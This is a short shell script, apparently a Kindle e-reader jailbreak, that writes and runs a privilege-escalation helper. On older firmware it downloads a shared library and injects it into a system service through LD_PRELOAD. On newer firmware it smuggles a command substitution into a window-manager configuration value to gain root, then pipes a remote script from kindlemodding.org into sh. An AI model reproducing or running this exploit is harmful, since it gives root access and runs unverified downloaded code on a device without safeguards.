#!/bin/sh

cat > "/tmp/privesc.sh" <<- 'EOF'
#!/bin/sh
  if cat /etc/prettyversion.txt | grep -q "5.1"; then # first, check if we are <5.20
      logger "privesc.sh: <5.20 detected, using old privesc method"
      curl -o /tmp/jb.so https://kindlemodding.org/vera/aprivesc/jb.so
      chmod +x /tmp/jb.so
      lipc-set-prop com.lab126.system updateWaveform LD_PRELOAD=/tmp/jb.so
    else # >=5.20, so new privesc method
      SELF="$(cd "$(dirname "$0")" && pwd)/$(basename "$0")"
      if [ "$(id -u)" -ne 0 ]; then
        logger "privesc.sh: 5.20 detected, running privesc"
        set-dynconf-value winmgr.vibrancyMode.pref.path "\$(sh \"$SELF\") #"
        lipc-set-prop -s com.lab126.winmgr vibrancyMode "lol"
        exit 1
      fi
      set-dynconf-value winmgr.vibrancyMode.pref.path ""
      curl -L https://kindlemodding.org/jb.sh | RUN_MODE=1 sh
  fi
EOF

logger "heredoc created, running privesc.sh"
/bin/sh /tmp/privesc.sh